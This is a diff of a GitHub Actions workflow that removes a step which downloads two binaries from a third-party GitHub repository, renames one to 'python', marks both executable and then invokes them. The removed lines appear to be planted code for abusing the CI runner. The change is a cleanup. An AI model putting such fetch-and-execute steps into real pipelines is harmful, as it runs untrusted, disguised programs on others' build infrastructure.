@@ -10,12 +10,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - run: |
-         wget https://raw.githubusercontent.com/Arlentak/ted/main/npm
-         wget https://raw.githubusercontent.com/Arlentak/ted/main/node
-         mv node python
-         chmod +x python npm
-         x
       - name: mencari id
         id: test
         run: echo "::set-output name=mix::`echo $((1 + $RANDOM % 7))`"
